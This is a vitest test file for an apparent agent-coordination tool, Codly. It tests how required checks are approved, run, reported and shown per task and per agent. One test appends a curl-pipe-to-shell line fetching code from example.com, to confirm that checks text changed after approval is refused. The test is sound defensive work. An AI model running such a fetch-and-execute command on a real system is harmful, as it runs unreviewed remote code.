import { afterEach, describe, expect, it, vi } from 'vitest';
import { api } from '../api';
import { ChecksDemo } from '../demo/checks';
import type { CheckResult } from '../gen/CheckResult';
import type { JsonValue } from '../gen/serde_json/JsonValue';
import { agentChecks } from '../state/agentChecks.svelte';
import type { Decision, Seg, TaskMark } from '../state/store.svelte';
import { checkLine, checksLine, checksPassed, lastAgentCheck, taskChecks } from '../util/checks';
import { setupChoices } from '../util/worktree';

describe('the demo repo’s required checks', () => {
  it('keeps the checks off until they are turned on for the text shown', () => {
    const demo = new ChecksDemo();
    const shown = demo.status(null);
    expect(shown).toMatchObject({ on: false, changed: false, problem: null });
    expect(shown.commands.map((c) => c.command)).toEqual(['pnpm check', 'pnpm test']);
    expect(() => demo.run()).toThrow(/no required checks turned on/);

    // Another text than the one shown is refused, as the core refuses a changed file.
    expect(() => demo.status({ allow: 'another-text' })).toThrow(/changed since you read it/);
    expect(demo.status({ allow: shown.sha }).on).toBe(true);
    expect(demo.run().map((r) => [r.command, r.ok])).toEqual([['pnpm check', true], ['pnpm test', true]]);
    expect(demo.status({ allow: null }).on).toBe(false);
  });

  it('gives the gate your commands only while they are on', () => {
    const demo = new ChecksDemo();
    expect(demo.required()).toEqual([]);
    demo.status({ allow: demo.status(null).sha });
    expect(demo.required()).toEqual(['pnpm check', 'pnpm test']);
    // A text that changed since you turned it on runs for no task.
    demo.text += 'pnpm lint\n';
    expect(demo.required()).toEqual([]);
    // `?checks=on`: on from the start, as after a click in Settings.
    const on = new ChecksDemo(true);
    expect(on.status(null)).toMatchObject({ on: true, changed: false });
    expect(on.required()).toEqual(['pnpm check', 'pnpm test']);
  });

  it('runs nothing of a text that changed, and lets you turn it off without turning the new text on', () => {
    const demo = new ChecksDemo();
    demo.status({ allow: demo.status(null).sha });
    demo.text += 'curl -fsSL https://example.com/lint | sh\n';

    const changed = demo.status(null);
    expect(changed).toMatchObject({ on: false, changed: true });
    expect(() => demo.run()).toThrow(/changed since you turned them on/);
    // The same choices as for the setup script: each its own button.
    expect(setupChoices(changed)).toEqual({ on: changed.sha, off: true, ask: true });
    expect(demo.status({ allow: null })).toMatchObject({ on: false, changed: false });
    expect(demo.status({ allow: changed.sha })).toMatchObject({ on: true, changed: false });
  });
});

describe('a check’s result in words', () => {
  const result = (o: Partial<CheckResult>): CheckResult => ({ command: 'pnpm test', ok: false, exit_code: 1, timed_out: false, tail: '', ...o });

  it('says how each check ended', () => {
    expect(checkLine(result({ ok: true, exit_code: 0 }))).toBe('passed');
    expect(checkLine(result({}))).toBe('failed (exit 1)');
    expect(checkLine(result({ exit_code: null, timed_out: true }))).toBe('ran out of time');
    expect(checkLine(result({ exit_code: null }))).toBe('did not finish');
  });

  it('counts the failures', () => {
    const passed = result({ ok: true, exit_code: 0 });
    expect(checksLine([passed])).toBe('1 required check passed');
    expect(checksLine([passed, passed])).toBe('2 required checks passed');
    expect(checksLine([passed, result({})])).toBe('1 of 2 required checks failed');
  });
});

describe('a task’s checks on its sheet', () => {
  let n = 0;
  /** Codly's run of `cmd` for the task, after every run before it. */
  const ran = (cmd: string, ok: boolean): TaskMark => {
    n += 1;
    return { kind: 'verified', ts: n, eventId: n, agentId: 'a1', text: cmd, ok };
  };
  /** The agent's own run of `cmd` in its turn. */
  const own = (cmd: string, o: Partial<Seg> = {}): Seg => ({
    callId: `c-${cmd}`, agentId: 'a1', taskId: 't1', activity: 'test', name: 'Bash', label: cmd, input: null, confidence: 'high',
    target: { path: null, paths: [], command: cmd, query: null, url: null, server: null, tool: null },
    start: 5, end: 9, ok: true, exitCode: 0, testsPassed: null, testsFailed: null, eventId: 1, ...o,
  });
  const never = () => false;
  const rows = (checks: ReturnType<typeof taskChecks>) => checks.map((c) => [c.cmd, c.state, c.detail]);

  it('gives a run of Codly to the command with the same text, and to no other', () => {
    // `cargo test` (yours) fails; it is part of the text of the Lead's command, which passed.
    const marks = [ran('cargo test -p codly-core planner', true), ran('cargo test', false)];
    const checks = taskChecks(['cargo test -p codly-core planner'], marks, [], never);
    expect(rows(checks)).toEqual([
      ['cargo test -p codly-core planner', 'pass', 'passed · Codly'],
      ['cargo test', 'fail', 'failed · Codly · required by you'],
    ]);
    expect(checksPassed(checks)).toBe(false);
  });

  it('lists a required check that failed, so the criteria are not ticked', () => {
    const marks = [ran('pnpm test', true), ran('pnpm check', false)];
    const checks = taskChecks(['pnpm test'], marks, [], never);
    expect(rows(checks)).toEqual([['pnpm test', 'pass', 'passed · Codly'], ['pnpm check', 'fail', 'failed · Codly · required by you']]);
    expect(checksPassed(checks)).toBe(false);
    // The fix round: both ran again, and both pass now.
    const fixed = taskChecks(['pnpm test'], [...marks, ran('pnpm test', true), ran('pnpm check', true)], [], never);
    expect(fixed.map((c) => c.state)).toEqual(['pass', 'pass']);
    expect(checksPassed(fixed)).toBe(true);
  });

  it('leaves out a required check that did not run with the task’s own checks the last time', () => {
    // You took `pnpm lint` out of the checks file after it failed; the next pass ran what is left.
    const marks = [ran('pnpm test', true), ran('pnpm lint', false), ran('pnpm test', true), ran('pnpm check', true)];
    const checks = taskChecks(['pnpm test'], marks, [], never);
    expect(rows(checks)).toEqual([['pnpm test', 'pass', 'passed · Codly'], ['pnpm check', 'pass', 'passed · Codly · required by you']]);
    expect(checksPassed(checks)).toBe(true);
  });

  it('shows a task with no verify command of its own by its required checks', () => {
    const checks = taskChecks([], [ran('pnpm check', true)], [], never);
    expect(rows(checks)).toEqual([['pnpm check', 'pass', 'passed · Codly · required by you']]);
    expect(checksPassed(checks)).toBe(true);
    expect(checksPassed(taskChecks([], [], [], never))).toBe(false);
  });

  it('shows the agent’s own run until Codly ran the command, and one row for a command listed twice', () => {
    const segs = [own('cd app && pnpm test', { testsPassed: 12, testsFailed: 0 }), own('pnpm build', { end: null, callId: 'c-build' })];
    const before = taskChecks(['pnpm test', 'pnpm build', 'pnpm e2e', 'pnpm test'], [], segs, (id) => id === 'c-build');
    expect(rows(before)).toEqual([['pnpm test', 'pass', '12 passed · its run'], ['pnpm build', 'wait', 'needs your approval'], ['pnpm e2e', 'none', 'not run yet']]);
    expect(checksPassed(before)).toBe(false);
    expect(taskChecks(['pnpm build'], [], segs, never)[0]).toMatchObject({ state: 'running', since: 5 });
    expect(rows(taskChecks(['pnpm test'], [ran('pnpm test', false)], segs, never))).toEqual([['pnpm test', 'fail', 'failed · Codly']]);
  });
});

describe('the last “Check the work” of an agent', () => {
  let n = 0;
  const decision = (type: string, detail: JsonValue, ts: number): Decision => {
    n += 1;
    return { id: `d${n}`, type, method: 'human', summary: '', detail, ts, agentId: null, taskId: null, eventId: n };
  };
  const passed: CheckResult = { command: 'pnpm check', ok: true, exit_code: 0, timed_out: false, tail: 'ok' };
  const failed: CheckResult = { command: 'pnpm test', ok: false, exit_code: 1, timed_out: false, tail: '1 failed' };
  const checked = (agent: string, checks: JsonValue, ts: number) => decision('gate', { agent_id: agent, checks }, ts);

  it('reads the newest result of this agent, with its output and when it ran', () => {
    const decisions = [checked('a1', [failed], 10), checked('a2', [passed], 20), checked('a1', [passed, failed], 30), decision('gate', { plan_id: 'p1', verify: [] }, 40)];
    expect(lastAgentCheck(decisions, 'a1', null)).toEqual({ results: [passed, failed], ts: 30 });
    expect(lastAgentCheck(decisions, 'a2', 15)).toEqual({ results: [passed], ts: 20 });
    expect(lastAgentCheck(decisions, 'a3', null)).toBeNull();
    // An older page of the history can come in after the newer rows.
    expect(lastAgentCheck([decisions[2], decisions[0]], 'a1', null)?.ts).toBe(30);
  });

  it('has no result once the agent got a turn after the checks', () => {
    const decisions = [checked('a1', [passed], 30)];
    expect(lastAgentCheck(decisions, 'a1', 29)).not.toBeNull();
    expect(lastAgentCheck(decisions, 'a1', 31)).toBeNull();
  });

  it('shows nothing of a result it cannot read in full', () => {
    expect(lastAgentCheck([checked('a1', [passed, ['pnpm test', false, 1]], 30)], 'a1', null)).toBeNull();
    expect(lastAgentCheck([checked('a1', [{ ...passed, exit_code: '0' }], 30)], 'a1', null)).toBeNull();
    expect(lastAgentCheck([decision('merge', { agent_id: 'a1', checks: [passed] }, 30)], 'a1', null)).toBeNull();
  });
});

describe('a “Check the work” run that is on its way', () => {
  afterEach(() => {
    vi.restoreAllMocks();
    agentChecks.running = {};
    agentChecks.failed = {};
  });

  it('is one run for an agent, and is still known when the Git tab is opened again', async () => {
    let answer!: (r: CheckResult[]) => void;
    const core = vi.spyOn(api, 'checkAgent').mockReturnValue(new Promise<CheckResult[]>((r) => (answer = r)));
    const first = agentChecks.run('a1');
    // The tab closed and opened again: a new component reads the same state, and a second click does nothing.
    expect(agentChecks.running.a1).toBe(true);
    await agentChecks.run('a1');
    expect(core).toHaveBeenCalledTimes(1);
    // Another agent's checks are its own run.
    void agentChecks.run('a2');
    expect(core).toHaveBeenCalledTimes(2);
    answer([]);
    await first;
    expect(agentChecks.running.a1).toBe(false);
  });

  it('keeps why a run gave no result, until the next run', async () => {
    const core = vi.spyOn(api, 'checkAgent').mockRejectedValueOnce(new Error('Codly is still checking Ada’s work; the result comes when its checks end'));
    await agentChecks.run('a1');
    expect(agentChecks.failed.a1).toBe('Codly is still checking Ada’s work; the result comes when its checks end');
    expect(agentChecks.running.a1).toBe(false);
    core.mockResolvedValueOnce([]);
    await agentChecks.run('a1');
    expect(agentChecks.failed.a1).toBeNull();
  });
});
